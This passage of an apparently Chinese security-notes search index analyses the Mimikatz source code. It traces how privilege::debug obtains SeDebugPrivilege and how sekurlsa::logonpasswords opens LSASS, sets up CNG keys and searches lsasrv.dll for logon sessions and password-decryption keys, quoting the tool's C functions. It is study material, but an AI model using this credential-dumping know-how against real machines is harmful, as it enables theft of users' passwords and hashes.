\u4f46\u662f\u5728\u5b89\u88c5\u4e86KB2871997\u8865\u4e01\u6216\u8005\u7cfb\u7edf\u7248\u672c\u5927\u4e8ewindows server 2012\u65f6\uff0c\u7cfb\u7edf\u7684\u5185\u5b58\u4e2d\u5c31\u4e0d\u518d\u4fdd\u5b58\u660e\u6587\u7684\u5bc6\u7801\uff0c\u8fd9\u6837\u5229\u7528mimikatz\u5c31\u4e0d\u80fd\u4ece\u5185\u5b58\u4e2d\u8bfb\u51fa\u660e\u6587\u5bc6\u7801\u4e86\u3002 pCommand\u6267\u884c\u4e86\u5982\u4e0b\u7684\u547d\u4ee4 NTSTATUS kuhl_m_sekurlsa_all(int argc, wchar_t * argv[]) { return kuhl_m_sekurlsa_getLogonData(lsassPackages, ARRAYSIZE(lsassPackages)); } lsassPackages \u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u8bb0\u5f55\u4e86\u5b89\u5168\u76f8\u5173\u6a21\u5757\u7684\u4e00\u4e9b\u4fe1\u606f \u7ee7\u7eed\u5f80\u4e0b\u8ddf\u8fdb NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages, ULONG nbPackages) { KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA OptionalData = {lsassPackages, nbPackages}; return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &OptionalData); } \u53ef\u4ee5\u53d1\u73b0kuhl_m_sekurlsa_enum \u4f7f\u7528\u4e86\u56de\u8c03\u51fd\u6570kuhl_m_sekurlsa_enum_callback_logondata\uff0c\u5173\u4e8e\u56de\u8c03\u51fd\u6570\u53ef\u4ee5\u770b\u770b\u83dc\u9e1f\u6559\u7a0b\u7684\u89e3\u91ca https://www.runoob.com/w3cnote/c-callback-function.html\u3002\u8ddf\u8fdbkuhl_m_sekurlsa_enum\uff0c\u8fd9\u4e2a\u51fd\u6570\u5f88\u957f\uff0c\u5206\u5f00\u6765\u770b\u3002 \u521d\u59cb\u5316\u5404\u79cd\u53d8\u91cf\uff0c\u5e76\u8c03\u7528kuhl_m_sekurlsa_acquireLSA\u65b9\u6cd5 KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData; ULONG nbListes = 1, i; PVOID pStruct; KULL_M_MEMORY_ADDRESS securityStruct, data = {&nbListes, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}; BOOL retCallback = TRUE; const KUHL_M_SEKURLSA_ENUM_HELPER * helper; NTSTATUS status = kuhl_m_sekurlsa_acquireLSA(); //input information about lsass to cLsass \u524d\u9762\u4e00\u5806\u662f\u521d\u59cb\u5316\u4e00\u4e9b\u53d8\u91cf\uff0c\u7136\u540e\u8c03\u7528kuhl_m_sekurlsa_acquireLSA,\u8fd9\u4e2a\u51fd\u6570\u5927\u4f53\u662f\u5c06lsass\u7684\u4e00\u4e9b\u4fe1\u606f\u653e\u5165cLsass\u53d8\u91cf\uff0ccLsass\u53d8\u91cf\u662fsekurlsa\u6a21\u5757\u6587\u4ef6\uff08 KUHL_M_SEKURLSA.c)\u4e2d\u7684\u4e00\u4e2a\u7ed3\u6784\u4f53\u53d8\u91cf\u3002 KUHL_M_SEKURLSA_CONTEXT cLsass = {NULL, {0, 0, 0}}; cLsass\u521a\u521d\u59cb\u5316\u65f6 \u6211\u4eec\u8ddf\u8fdbkuhl_m_sekurlsa_acquireLSA\u65b9\u6cd5\uff0c\u770b\u5b83\u5177\u4f53\u662f\u505a\u4e86\u4ec0\u4e48\u3002 kuhl_m_sekurlsa_acquireLSA \u521d\u59cb\u5316\u53d8\u91cf\u5e76\u83b7\u53d6LSASS\u8fdb\u7a0b\u53e5\u67c4 \u8fdb\u53bb\u4ee5\u540e\u5148\u5b9a\u4e49\u4e00\u5927\u5806\u53d8\u91cf NTSTATUS status = STATUS_SUCCESS; KULL_M_MEMORY_TYPE Type; HANDLE hData = NULL; DWORD pid, cbSk; PMINIDUMP_SYSTEM_INFO pInfos; DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION); BOOL isError = FALSE; PBYTE pSk; \u7d27\u968f\u5176\u540e\u7684\u662f\u4e00\u5927\u5757\u5d4c\u5957if\u3002\u7b2c\u4e00\u5c42if\u4fbf\u662f\u5224\u65adcLsass\u4e2dhLsassMem\u662f\u5426\u4e3afalse\u503c\uff0c\u5f88\u663e\u7136\u662f\u7684\uff08\u521d\u59cb\u5316\u5b9a\u4e49\u7684\u65f6\u5019\u5c31\u662fnull\uff0ccLsass\u5728\u521d\u59cb\u5316\u540e\u8fd8\u6ca1\u6709\u4efb\u4f55\u53d8\u52a8\u3002) \u7136\u540e\u5728\u7b2c\u4e8c\u5c42if\u91cc\u5224\u65adpMinidumpName\u7684\u771f\u503c(Minidump\u4e5f\u662f\u4e00\u4e2aCommand\uff0c\u7528\u4e8e\u79bb\u7ebf\u63d0\u53d6hash\uff09\uff0c\u8fd9\u4e2a\u5c5e\u6027\u548ccLsass\u4e00\u6837\u4e5f\u662f\u5b58\u5728\u4e8e\u6a21\u5757\u6587\u4ef6\u4e2d\u7684\u53d8\u91cf\u4e14\u9ed8\u8ba4\u4e3aFALSE\uff0c\u6240\u4ee5\u4f1a\u8c03\u7528kull_m_process_getProcessIdForName\u51fd\u6570\uff08\u8fd9\u4e2a\u5c31\u5148\u4e0d\u7ec6\u8ddf\u4e86\uff09\u53bb\u83b7\u53d6lsass\u8fdb\u7a0b\u7684\u8fdb\u7a0bpid\u5e76\u901a\u8fc7OpenProcess\u83b7\u53d6\u5176\u8fdb\u7a0b\u53e5\u67c4 if(!cLsass.hLsassMem) { status = STATUS_NOT_FOUND; if(pMinidumpName) { Type = KULL_M_MEMORY_TYPE_PROCESS_DMP; kprintf(L\"Opening : \\'%s\\' file for minidump...\\n\", pMinidumpName); hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); } else { Type = KULL_M_MEMORY_TYPE_PROCESS; if(kull_m_process_getProcessIdForName(L\"lsass.exe\", &pid)) //\u83b7\u53d6lsass.exe\u7684pid hData = OpenProcess(processRights, FALSE, pid); //\u83b7\u53d6lsass.exe\u7684\u8fdb\u7a0b\u53e5\u67c4 else PRINT_ERROR(L\"LSASS process not found (?)\\n\"); } kuhl_m_sekurlsa_acquireLSA \u5411cLsass\u5199\u5165\u7248\u672c\u4fe1\u606f \u518d\u7136\u540e\u4fbf\u662f\u53e6\u5916\u4e00\u4e2a\u7b2c\u4e8c\u5c42\u7684\u5d4c\u5957if\u5224\u65ad\u903b\u8f91\uff0c\u5f88\u591a\uff0c\u4f46\u903b\u8f91\u4e0d\u96be\u3002 \u7b2c\u4e8c\u5c42lf\u5224\u65ad\u4e86OpenProcess\u83b7\u53d6lsass.exe\u8fdb\u7a0b\u53e5\u67c4\u662f\u5426\u6210\u529f \u7b2c\u4e09\u5c42if\u8c03\u7528kull_m_memory_open\u5e76\u5224\u65ad\u5176\u8fd4\u56de\u503c\u771f\u503c\uff0c\u8fd9\u4e2a\u51fd\u6570\u6839\u636e\u4f20\u5165\u7684Type\u7684\u503c\u6765\u91c7\u53d6\u4e0d\u540c\u884c\u52a8\uff0c\u4f46\u5927\u81f4\u90fd\u662f\u5c06\u53e5\u67c4\u585e\u8fdb\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5b9a\u7684\u7ed3\u6784\u4f53\u7684\u67d0\u5904 \u7b2c\u56db\u5c42if\u5224\u65adType\u503c\u662f\u5426\u4e3aKULL_M_MEMORY_TYPE_PROCESS_DMP\uff0c\u5f88\u663e\u7136\u4e0d\u662f\u7684\uff0csekurlsa::logonpasswords\u5230\u8fd9\u91cc\u4e0d\u4f1a\u8fdb\u4e00\u6b65\u8ddf\u8fdb\u4e86 \u5728windows\u4e2d\u4f1a\u76f4\u63a5\u8fdb\u5165\u5230\u7ed9cLsass\u8d4b\u503c\uff0c\u5c06\u7248\u672c\u4fe1\u606f\u7b49\u8d4b\u503c\u5230cLsass\u7ed3\u6784\u4f53\u4e2d kuhl_m_sekurlsa_acquireLSA \u751f\u6210CNG\u53e5\u67c4 \u8fc7\u540e\u8fd8\u6709\u4e00\u4e2a\u7b2c\u56db\u5c42If\u5224\u65ad\uff0c\u5b83\u5224\u65adisError\u8fd9\u4e2a\u53d8\u91cf\u7684\u771f\u503c\u3002\u8fd9\u4e2a\u53d8\u91cf\u521d\u59cb\u5b9a\u4e49\u4e3afalse\uff0c\u6240\u4ee5\u4ee3\u7801\u4f1a\u8ddf\u8fdb\u8fd9\u4e2aif\uff0c\u8fd9\u4e00\u5c42\u4e3b\u8981\u662f\u7ed9lsassLocalHelper\u53d8\u91cf\u8d4b\u503c\uff0c\u8fd9\u4e2a\u53d8\u91cf\u4f1a\u56e0\u4e3awindows\u7248\u672c\u4e0d\u540c\u800c\u4e0d\u540c\uff0c\u4e3b\u8981\u7528\u4e8e\u8bb0\u5f55lsass\u8fdb\u7a0b\u7684\u4e00\u4e9b\u8f85\u52a9\u4fe1\u606f \u968f\u540e\u5728\u63a5\u4e0b\u6765\u7684\u7b2c\u4e94\u5c42if\u91cc\u4f1a\u8c03\u7528lsassLocalHelper\u7ed3\u6784\u4f53\u4e2d\u7684initLocalLib\u65b9\u6cd5\u5e76\u901a\u8fc7\u4e00\u4e2a\u5b8f\u5224\u65ad\u5176\u8fd4\u56de\u503c (#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)) if(!isError) { lsassLocalHelper = #if defined(_M_ARM64) &lsassLocalHelpers[0] #else (cLsass.osContext.MajorVersion < 6) ? &lsassLocalHelpers[0] : &lsassLocalHelpers[1] #endif ; if(NT_SUCCESS(lsassLocalHelper->initLocalLib())) { //code } NTSTATUS kuhl_m_sekurlsa_nt6_init() { if(!NT_SUCCESS(kuhl_m_sekurlsa_nt6_KeyInit)) kuhl_m_sekurlsa_nt6_KeyInit = kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory(); return kuhl_m_sekurlsa_nt6_KeyInit; } NTSTATUS kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory() { NTSTATUS status = STATUS_NOT_FOUND; ULONG dwSizeNeeded; __try { status = BCryptOpenAlgorithmProvider(&k3Des.hProvider, BCRYPT_3DES_ALGORITHM, NULL, 0); if(NT_SUCCESS(status)) { status = BCryptSetProperty(k3Des.hProvider, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0); if(NT_SUCCESS(status)) { status = BCryptGetProperty(k3Des.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE) &k3Des.cbKey, sizeof(k3Des.cbKey), &dwSizeNeeded, 0); if(NT_SUCCESS(status)) k3Des.pKey = (PBYTE) LocalAlloc(LPTR, k3Des.cbKey); } } if(NT_SUCCESS(status)) { status = BCryptOpenAlgorithmProvider(&kAes.hProvider, BCRYPT_AES_ALGORITHM, NULL, 0); if(NT_SUCCESS(status)) { status = BCryptSetProperty(kAes.hProvider, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0); if(NT_SUCCESS(status)) { status = BCryptGetProperty(kAes.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE) &kAes.cbKey, sizeof(kAes.cbKey), &dwSizeNeeded, 0); if(NT_SUCCESS(status)) kAes.pKey = (PBYTE) LocalAlloc(LPTR, kAes.cbKey); } } } } __except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){} return status; } \u4ee5\u4e0b\u662fCNG API\uff1a \u6253\u5f00\u7b97\u6cd5\u63d0\u4f9b\u8005\uff1a BCryptOpenAlgorithmProvider \u5bfc\u5165\u5bc6\u94a5\uff1a BCryptGenerateSymmetricKey \u521b\u5efa\u5bc6\u94a5\uff1a BCryptCreateHash BCryptHashData BCryptFinishHash BCryptGenerateSymmetricKey \u83b7\u53d6\u6216\u8bbe\u7f6e\u7b97\u6cd5\u5c5e\u6027\uff1a BCryptGetProperty BCryptSetProperty \u6267\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\uff1a BCryptEncrypt BCryptDecrypt \u679a\u4e3e\u63d0\u4f9b\u8005\uff1a BCryptEnumRegisteredProviders \u5173\u95ed\u7b97\u6cd5\u63d0\u4f9b\u8005\uff1a BCryptCloseAlgorithmProvider \u9500\u6bc1\u5bc6\u94a5\uff1a BCryptDestroyKey \u9500\u6bc1\u54c8\u5e0c\uff1a BCryptDestroyHash \u53ef\u4ee5\u5728\u521a\u521a\u7684\u4ee3\u7801\u91cc\u770b\u89c1BCryptOpenAlgorithmProvider\u8fd9\u79cdAPI\uff0c\u8fd9\u79cdAPI\u7528\u4e8e\u5bc6\u94a5\u7684\u751f\u6210\u3002 NTSTATUS BCryptOpenAlgorithmProvider( BCRYPT_ALG_HANDLE *phAlgorithm, //\u63a5\u6536CNG \u53e5\u67c4 LPCWSTR pszAlgId, //\u52a0\u5bc6\u6a21\u5f0f LPCWSTR pszImplementation, //\u9009\u5b9aprovider\uff0c\u5982\u679c\u4e3aNULL\u5219\u9009\u7528\u52a0\u5bc6\u6a21\u5f0f\u5bf9\u5e94\u7684\u9ed8\u8ba4provider ULONG dwFlags //\u5b9a\u4e49\u51fd\u6570\u5177\u4f53\u884c\u4e3a ); https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptopenalgorithmprovider NTSTATUS BCryptSetProperty( BCRYPT_HANDLE hObject, //CNG\u53e5\u67c4 LPCWSTR pszProperty, //\u9700\u8981\u88ab\u8bbe\u7f6e\u7684\u5c5e\u6027\u540d PUCHAR pbInput, //\u5b58\u50a8\u65b0\u5c5e\u6027\u503c\u7684\u7f13\u51b2\u533a\u5730\u5740 ULONG cbInput, //\u7f13\u51b2\u533a\u5927\u5c0f ULONG dwFlags //\u4e00\u76f4\u4e3a0 ); NTSTATUS BCryptGetProperty( BCRYPT_HANDLE hObject, //CNG\u53e5\u67c4 LPCWSTR pszProperty, //\u9700\u8981\u88ab\u63a5\u53d7\u7684\u5c5e\u6027\u540d PUCHAR pbOutput, //\u63a5\u6536\u5c5e\u6027\u503c\u7684\u7f13\u51b2\u533a\u5730\u5740 ULONG cbOutput, //\u7f13\u51b2\u533a\u5927\u5c0f ULONG *pcbResult, //\u4e00\u4e2a\u7528\u6765\u63a5\u6536\u88ab\u590d\u5236\u5230\u7f13\u51b2\u533a\u7684\u5b57\u8282\u6570\u91cf\u7684\u53d8\u91cf ULONG dwFlags //\u4e00\u76f4\u4e3a0 ); kuhl_m_sekurlsa_acquireLSA \u6838\u5fc3\u90e8\u5206 \u5728if\u6761\u4ef6\u4e2d\u751f\u6210CNG \u53e5\u67c4\u540e\uff0c\u5230\u8fd9\u91cc\u5c31\u63a5\u8fd1sekurlsa::logonpasswords\u7684\u6838\u5fc3\u90e8\u5206\u4e86 \u8fdb\u5165\u5230\u6b64IF\u4e2d\u4e00\u5f00\u59cb\u4f1a\u6839\u636ewindows\u7248\u672c\u6765\u5224\u65ad\u4e00\u4e9bwindows\u8ba4\u8bc1\u529f\u80fd\u662f\u5426\u53ef\u7528\uff08livessp,tspkg,cloudap) if(NT_SUCCESS(lsassLocalHelper->initLocalLib())) { #if !defined(_M_ARM64) kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8); #endif kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2); kuhl_m_sekurlsa_cloudap_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_BUILD_10_1909); if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent) //\u83b7\u53d6lsass\u4e2d\u76f8\u5173DLL\u7684\u4fe1\u606f\uff0c\u82e5\u67d0dll\u5b58\u5728\u5219\u5728lsasspackages\u53d8\u91cf\u4e2d\u5c06\u5176\u6807\u8bb0 { kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module; if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module)) //\u901a\u8fc7LsaSrv.dll\u83b7\u53d6\u767b\u5f55\u4f1a\u8bdd(lsasrv.dll\u662f\u4e00\u4e2a\u7528\u4e8ewinnt\u64cd\u4f5c\u7cfb\u7edf\u7684\u672c\u5730\u5b89\u5168\u5bc6\u7801\u9a8c\u8bc1\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u6587\u4ef6) { status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations); //\u63d0\u53d6\u7528\u6237\u5bc6\u7801\u7684\u5bc6\u94a5 if(!NT_SUCCESS(status)) PRINT_ERROR(L\"Key import\\n\"); } else PRINT_ERROR(L\"Logon list\\n\"); } else PRINT_ERROR(L\"Modules informations\\n\"); } \u626b\u63cflsass\u8fdb\u7a0bLDR\u94fe\u83b7\u53d6DLL\u4fe1\u606f \u7136\u540e\u4fbf\u662f\u901a\u8fc7kull_m_process_getVeryBasicModuleInformations\u65b9\u6cd5\u6765\u83b7\u53d6lsass\u4e2d\u76f8\u5173DLL\u7684\u4fe1\u606f\uff0c\u82e5\u67d0dll\u5b58\u5728\u5219\u5728lsasspackages\u53d8\u91cf\u4e2d\u5c06\u5176\u6807\u8bb0 \u5982\u4e0b\u56fe\uff0cisPresent\u4e3a1\u5219\u6807\u8bc6\u8be5dll\u5b58\u5728 \u901a\u8fc7lsasrv.dll\u83b7\u53d6\u767b\u5f55\u4f1a\u8bdd \u5411\u4e0b\uff0c\u901a\u8fc7kuhl_m_sekurlsa_utils_search\u6765\u901a\u8fc7LsaSrv.dll\u83b7\u53d6\u7528\u6237\u767b\u5f55\u4f1a\u8bdd\u4fe1\u606f\u3002\u5177\u4f53\u662f\u901a\u8fc7\u5b57\u7b26\u4e32\u5339\u914ddll\u4e2d\u7684\u4fe1\u606f\u6765\u8fbe\u5230\u83b7\u53d6\u7528\u6237\u767b\u5f55\u4f1a\u8bdd\u4fe1\u606f\u7684\u76ee\u7684 \u6211\u4eec\u8ddf\u8fdb\u5b83\uff0c\u8ddf\u4e0b\u53bb\uff0c\u4f1a\u6765\u5230\u6b64\u5904 currentReference\u662f\u6839\u636e\u7248\u672c\u786e\u5b9a\u7684lsasrv\u8be6\u7ec6\u4fe1\u606f\uff0c\u88ab\u5b9a\u4e49\u5728\u5982\u4e0b\u7ed3\u6784\u4f53\uff0c\u4e3a\u5982\u4e0b\u7ed3\u6784\u4f53\u4e2d\u7684\u4e00\u9879 \u8fd9\u91cc\u89e3\u91ca\u4e00\u4e0bkull_m_memory_search\u4e2d\u5404\u53c2\u6570\u610f\u4e49\uff1a aLocalMemory.address \u8868\u793alsasrv.dll\u7684\u4e00\u4e2a\u5730\u5740\uff0c \u7b2c\u4e8c\u4e2a\u53c2\u6570currentReference->Search.Length\u6bd4\u8f83\u7b80\u5355\uff0c\u5c31\u662f\u7528\u4e8e\u6307\u5b9a\u641c\u7d22\u957f\u5ea6 sMemory\u6bd4\u8f83\u91cd\u8981, KULL_M_MEMORY_SEARCH sMemory = {{{pLib->Informations.DllBase.address, cLsass->hLsassMem}, pLib->Informations.SizeOfImage}, NULL}; address\u8bb0\u5f55lsasrv.dll\u5728lsass\u8fdb\u7a0b\u4e2d\u7684\u504f\u79fb\u91cf\uff08\u5728kuhl_m_sekurlsa_msv_package.Module\u4e2d\u5b9a\u4e49\u7684\uff09\uff0chMemory\u8bb0\u5f55lsass\u53e5\u67c4\u7684\u76f8\u5173\u4fe1\u606f \u6211\u4eec\u8ddf\u8fdb\u65b9\u6cd5kull_m_memory_search BOOL kull_m_memory_search(IN PKULL_M_MEMORY_ADDRESS Pattern, IN SIZE_T Length, IN PKULL_M_MEMORY_SEARCH Search, IN BOOL bufferMeFirst) \u4f1a\u6765\u5230\u6b64\u5904\u3002 \u6211\u4eec\u53d1\u73b0\u518d\u4e00\u6b21\u8c03\u7528\u4e86kull_m_memory_search,\u8ddf\u8fdb\u4f1a\u6765\u5230\u8fd9\u91cc\u3002\u8fd9\u91cc\u7684\u4f5c\u7528\u4fbf\u662f\u4ecelsass\u8fdb\u7a0blsasrv.dll\u5185\u5b58\u5185\u5bb9\u7684\u5f00\u59cb\u4e00\u76f4\u5faa\u73af\u67e5\u8be2\uff0c\u76f4\u5230\u5728lsasrv.dll\u5185\u5b58\u5185\u5bb9\u4e2d\u67e5\u8be2\u5230\u4e0ecurrentReference->Search.Pattern \u8868\u793a\u7684\u5730\u5740\u5185\u5bb9\u4e00\u81f4\u7684 \u5730\u5740 BOOL WINAPI RtlEqualMemory( void* Destination, void* Source, size_t Length ); The RtlEqualMemory routine compares two blocks of memory to determine whether the specified number of bytes are identical. \u7136\u540e\u4fbf\u662f\u628aCurrentPtr\u7684\u4fe1\u606f\u653e\u5165sBuffer.result \uff0c\u7b2c\u4e8c\u5c42kull_m_memory_search\u7ed3\u675f \u7b2c\u4e00\u5c42kull_m_memory_search\u901a\u8fc7sBuffer.result\u4e2d\u7684\u4fe1\u606f\u5f97\u5230\u6267\u884c\u6240\u627e\u5230\u7684\u533a\u57df\u7684\u6307\u9488\uff0c\u7136\u540e\u5c06\u8be5\u6307\u9488\u4f20\u51fa\u6765\u653e\u5230sMemory.result\u91cc\uff0c\u518d\u7531\u4e00\u7cfb\u5217\u53d8\u5316\u83b7\u5f97\u6307\u5411\u767b\u9646\u4ee4\u724c\u7684\u6307\u9488","title":"Mimikatz\u5206\u6790"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#mimikatz","text":"","title":"Mimikatz\u5206\u6790"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#_1","text":"\u4ece\u8f93\u5165\u547d\u4ee4\u5230privilege::debug mimikatz\u4e2d\u51fa\u73b0\u8fc7\u7684\u7279\u6b8a\u8bed\u6cd5 ((LONG)(LONG_PTR)&(((type *)0)->field)) mimikatz\u5e38\u89c1API kull_m_memory_copy rekurlsa logonpasswords \u521d\u59cb\u5316\u5404\u79cd\u53d8\u91cf\uff0c\u5e76\u8c03\u7528kuhl_m_sekurlsa_acquireLSA\u65b9\u6cd5 kuhl_m_sekurlsa_acquireLSA \u521d\u59cb\u5316\u53d8\u91cf\u5e76\u83b7\u53d6LSASS\u8fdb\u7a0b\u53e5\u67c4 kuhl_m_sekurlsa_acquireLSA \u5411cLsass\u5199\u5165\u7248\u672c\u4fe1\u606f kuhl_m_sekurlsa_acquireLSA \u751f\u6210CNG\u53e5\u67c4 kuhl_m_sekurlsa_acquireLSA \u6838\u5fc3\u90e8\u5206 \u626b\u63cflsass\u8fdb\u7a0bLDR\u94fe\u83b7\u53d6DLL\u4fe1\u606f \u901a\u8fc7lsasrv.dll\u83b7\u53d6\u767b\u5f55\u4f1a\u8bdd \u4e00\u4e9b\u4e0d\u592a\u91cd\u8981\u7684\u4ee3\u7801\u5c31\u7528\u56fe\u4ee3\u66ff\u4e86\u3002","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#privilegedebug","text":"\u7a0b\u5e8f\u5f00\u542f\uff0c\u8fdb\u5165wmain\u51fd\u6570 \u3002 \u5148\u8c03\u7528\u4e00\u4e2amimikatz_begin \u8f93\u51falogo\u4ee5\u53ca\u505a\u4e00\u4e9b\u57fa\u672c\u7684\u51c6\u5907\u5de5\u4f5c\uff08\u5177\u4f53\u662f\u5565\u51c6\u5907\u5de5\u4f5c\u5c31\u4e0d\u7ba1\u4e86\uff09 wmain\u4e2d\u5f80\u4e0b\uff0c\u8c03\u7528mimikatz_dispatchCommand \u5e76\u4f20\u5165\u8f93\u5165mimikatz\u7684\u53c2\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u68c0\u6d4b\u8f93\u5165\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u4e3a!\u6216\u8005*\u6216\u8005\u5176\u4ed6\uff0c\u7136\u540e\u4f7f\u903b\u8f91\u8fdb\u5165\u4e0b\u4e00\u5c42\u3002\u4e00\u822c\u6765\u8bf4\uff0cmimikatz\u4e2d\u6211\u4eec\u8f93\u5165\u7684\u547d\u4ee4\u7b2c\u4e00\u4e2a\u5b57\u7b26\u90fd\u4e0d\u662f!\u6216\u8005*\uff0c\u6240\u4ee5\u4f1a\u628a\u6211\u4eec\u7684\u8f93\u5165\u4f20\u5165mimikatz_doLocal\u8fdb\u884c\u4e00\u4e2a\u5904\u7406\u3002 \u8fd9\u4e2a\u51fd\u6570\u4f1a\u5148\u5c06\u8f93\u5165\u7684\u5b57\u7b26\u5206\u4e3amodule\u548ccommand\u4e24\u90e8\u5206\uff0cmoudule\u5c31\u662f::\u524d\u7684\u90e8\u5206\uff0ccommand\u5c31\u662f::\u540e\u7684\u90e8\u5206\u3002\uff08privilege::debug privilege\u662fmodule,debug\u662fcommand\uff09\u3002\u7136\u540e\u5faa\u73af\u904d\u5386mimikatz_modlues\u7ed3\u6784\u4f53\uff0c\u76f4\u5230\u627e\u5230\u5bf9\u5e94\u7684module\u4e2d\u5bf9\u5e94\u7684command\uff0c\u7136\u540e\u6267\u884c\u5176pCommand\u65b9\u6cd5\u3002 \u4e00\u4e2amimikatz_modlues\u7ed3\u6784\u4f53\u7684\u5e03\u5c40\u5982\u4e0b\uff0c\u8fd9\u91cc\u4ee5privilege\u4e3a\u4f8b\u3002 privilege::debug\u4f1a\u8c03\u7528kuhl_m_privilege_debug\u65b9\u6cd5\uff0c\u5176\u6838\u5fc3\u4fbf\u662f\u901a\u8fc7RtlAdjustPrivilege\u51fd\u6570\u83b7\u53d6SeDebugPrivilege\u6743\u3002 TSTATUS kuhl_m_privilege_debug(int argc, wchar_t * argv[]) { return kuhl_m_privilege_simple(SE_DEBUG); \\\\SE_DEBUG\u7684\u503c\u662f\u5b9a\u4e49\u597d\u768420\uff0c\u5373SeDebugPrivilege\u5bf9\u5e94\u7684\u6743\u9650\u53c2\u6570\u3002 } NTSTATUS kuhl_m_privilege_simple(ULONG privId) { ULONG previousState; NTSTATUS status = RtlAdjustPrivilege(privId, TRUE, FALSE, &previousState); \\\\\u4e3a\u5f53\u524d\u8fdb\u7a0b\u83b7\u53d6SeDebugPrivilege\u6743\u9650 if(NT_SUCCESS(status)) kprintf(L\"Privilege \\'%u\\' OK\\n\", privId); else PRINT_ERROR(L\"RtlAdjustPrivilege (%u) %08x\\n\", privId, status); return status; } \u8fd9\u91cc\u5b83\u7528\u5230\u4e86\u4e00\u4e2a\u5173\u952eAPI \uff0cRtlAdjustPrivilege\u3002\u8fd9\u4e2aAPI\u6ca1\u6709\u5b98\u65b9\u89e3\u91ca\uff0c\u4f46\u662f\u6839\u636e\u6c11\u95f4\u7684\u6d4b\u8bd5\uff0c\u5b83\u5177\u6709\u63d0\u6743\u529f\u80fd\u3002 NTSTATUS RtlAdjustPrivilege ( ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled ) Privilege [In] Privilege index to change. // \u6240\u9700\u8981\u7684\u6743\u9650\u540d\u79f0\uff0c\u53ef\u4ee5\u5230 MSDN \u67e5\u627e\u5173\u4e8e Process Token & Privilege \u5185\u5bb9\u53ef\u4ee5\u67e5\u5230 Enable [In] If TRUE, then enable the privilege otherwise disable. // \u5982\u679c\u4e3aTrue \u5c31\u662f\u6253\u5f00\u76f8\u5e94\u6743\u9650\uff0c\u5982\u679c\u4e3aFalse \u5219\u662f\u5173\u95ed\u76f8\u5e94\u6743\u9650 CurrentThread [In] If TRUE, then enable in calling thread, otherwise process. // \u5982\u679c\u4e3aTrue \u5219\u4ec5\u63d0\u5347\u5f53\u524d\u7ebf\u7a0b\u6743\u9650\uff0c\u5426\u5219\u63d0\u5347\u6574\u4e2a\u8fdb\u7a0b\u7684\u6743\u9650 Enabled [Out] Whether privilege was previously enabled or disabled. // \u8f93\u51fa\u539f\u6765\u76f8\u5e94\u6743\u9650\u7684\u72b6\u6001\uff08\u6253\u5f00 | \u5173\u95ed\uff09, \u6ce8\u610f\uff1a\u8be5\u53c2\u6570\u8d4b\u4e88\u7a7a\u6307\u9488\u4f1a\u51fa\u9519\uff0c\u6211\u6d4b\u8bd5\u8fc7\u3002 